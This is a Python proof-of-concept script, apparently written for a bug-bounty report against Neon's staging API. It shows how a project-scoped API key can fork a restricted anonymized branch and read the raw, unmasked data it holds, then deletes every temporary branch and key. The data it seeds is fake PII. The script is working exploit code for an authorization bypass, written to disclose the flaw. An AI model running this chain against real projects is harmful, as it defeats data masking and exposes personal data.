# -*- coding: utf-8 -*-
"""U18B: reproduce the bypass chain under a project-scoped API key.
Project-scoped keys (org key + project_id) are the only scoped key type the
product supports (docs: Editor access on the project) and are creatable by
admins via UI. Chain: seed source -> restricted anon branch (start=false, raw)
-> fork it using ONLY the project-scoped key -> connection_uri -> raw read.
Zero-destruction: own project, all temp branches/keys deleted at the end."""
import json
import ssl
import time
import http.client
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _pg import connect, query, exec_

HOST = "console-stage.neon.build"
BASE = "/api/v2"
HB = {"X-Bug-Bounty": "xxbo"}
PA = "orange-sun-90493739"
PAMAIN = "br-wandering-field-w2ob6mpn"
ORG = "org-flat-dawn-91601224"
LOG = r"F:\scan\neon_report\_u18b_out.txt"

with open(r"F:\scan\neon_report\_apikey.json", encoding="utf-8") as fh:
    MAINKEY = json.load(fh)["key"]


def out(s):
    print(s, flush=True)
    with open(LOG, "a", encoding="utf-8") as fh:
        fh.write(s + "\n")


def call(method, path, body=None, key=MAINKEY, timeout=60):
    ctx = ssl.create_default_context()
    conn = http.client.HTTPSConnection(HOST, timeout=timeout, context=ctx)
    payload = json.dumps(body) if body is not None else None
    hdrs = dict(HB, Authorization="Bearer " + key)
    if body is not None:
        hdrs["Content-Type"] = "application/json"
    conn.request(method, BASE + path, body=payload, headers=hdrs)
    r = conn.getresponse()
    data = r.read().decode("utf-8", "replace")
    conn.close()
    return r.status, data


def cred_of(bid, key=MAINKEY):
    st, d = call("GET", "/projects/%s/connection_uri?database_name=neondb&role_name=neondb_owner&branch_id=%s" % (PA, bid), key=key)
    if st != 200:
        return None, (st, d[:150])
    from urllib.parse import urlsplit
    u = urlsplit(json.loads(d)["uri"])
    return (u.hostname, u.username, u.password), None


def wait_ready(bid, key=MAINKEY, tries=30):
    for _ in range(tries):
        st, d = call("GET", "/projects/%s/branches/%s" % (PA, bid), key=key)
        if st == 200:
            b = json.loads(d).get("branch", {})
            if b.get("current_state") == "ready" and not b.get("pending_state"):
                return True
        time.sleep(3)
    return False


# ---- cleanup leftovers ----
st, d = call("GET", "/organizations/%s/api_keys" % ORG)
try:
    for k in json.loads(d).get("api_keys", []):
        if str(k.get("name", "")).startswith("u18b"):
            call("DELETE", "/organizations/%s/api_keys/%s" % (ORG, k.get("id")))
except Exception:
    pass
st, d = call("GET", "/projects/%s/branches" % PA)
for b in json.loads(d).get("branches", []):
    if str(b.get("name", "")).startswith("u18b"):
        call("DELETE", "/projects/%s/branches/%s" % (PA, b["id"]))
time.sleep(2)

# ---- project-scoped key ----
st, d = call("POST", "/organizations/%s/api_keys" % ORG, {"key_name": "u18b-ps", "project_id": PA})
out("create project-scoped key: %d %s" % (st, d[:240]))
PS = None
PSID = None
FORK = None
ANON = None
SRC = None
if st in (200, 201):
    j = json.loads(d)
    PS, PSID = j.get("key"), j.get("id")

try:
    if not PS:
        raise SystemExit("no project-scoped key created")

    # ---- source branch + seed ----
    st, d = call("POST", "/projects/%s/branches" % PA,
                 {"branch": {"name": "u18b-src", "parent_id": PAMAIN},
                  "endpoints": [{"type": "read_write"}]})
    SRC = json.loads(d)["branch"]["id"]
    out("src=%s ready=%s" % (SRC, wait_ready(SRC)))
    hp = None
    err = None
    for _ in range(20):
        hp, err = cred_of(SRC)
        if hp:
            break
        time.sleep(3)
    if not hp:
        raise SystemExit("no src cred: %s" % (err,))
    c = connect(*hp)
    exec_(c, "create table if not exists u18b_pii(id int, email text, secret text)")
    exec_(c, "delete from u18b_pii")
    exec_(c, "insert into u18b_pii values (1,'alice.real@victimcorp.com','ssn-111-22-3333')")
    c.close()
    out("src seeded")

    # ---- restricted anon branch (never started, raw, restricted) ----
    st, d = call("POST", "/projects/%s/branch_anonymized" % PA, {
        "branch_create": {"branch": {"name": "u18b-anon", "parent_id": SRC},
                          "endpoints": [{"type": "read_write"}]},
        "masking_rules": [{"database_name": "neondb", "schema_name": "public",
                           "table_name": "u18b_pii", "column_name": "email",
                           "masking_function": "anon.fake_email()"}],
        "start_anonymization": False,
    })
    out("branch_anonymized: %d %s" % (st, d[:260]))
    if st in (200, 201):
        j = json.loads(d)
        ANON = j["branch"]["id"]
        out("anon=%s restricted_actions=%s" % (ANON, j["branch"].get("restricted_actions")))

    # ---- fork with the project-scoped key ONLY ----
    if ANON:
        st, d = call("POST", "/projects/%s/branches" % PA,
                     {"branch": {"name": "u18b-fork", "parent_id": ANON},
                      "endpoints": [{"type": "read_write"}]}, key=PS)
        out("PS-key fork of restricted branch: %d %s" % (st, d[:260]))
        if st in (200, 201):
            j = json.loads(d)
            FORK = j["branch"]["id"]
            out("fork=%s child restricted_actions=%s" % (FORK, j["branch"].get("restricted_actions")))

    # ---- PS key: credential + data read ----
    if FORK:
        out("fork ready=%s" % wait_ready(FORK, key=PS))
        hp2, err = cred_of(FORK, key=PS)
        out("PS-key GET connection_uri(fork): %s" % ("OK" if hp2 else "FAIL %s" % (err,)))
        if hp2:
            c = connect(*hp2)
            rows = query(c, "select * from u18b_pii")
            c.close()
            raw = "alice.real" in repr(rows)
            out("PS-KEY DATA READ: RAW=%s rows=%s" % (raw, repr(rows)[:200]))
finally:
    for bid in [FORK, ANON, SRC]:
        if bid:
            st, _ = call("DELETE", "/projects/%s/branches/%s" % (PA, bid))
            out("del branch %s: %d" % (bid, st))
            time.sleep(2)
    if PSID:
        st, d = call("DELETE", "/organizations/%s/api_keys/%s" % (ORG, PSID))
        out("del PS key: %d" % st)
    st, d = call("GET", "/projects/%s/branches" % PA)
    out("FINAL branches: %s" % [b.get("name") for b in json.loads(d).get("branches", [])])
    out("== DONE")
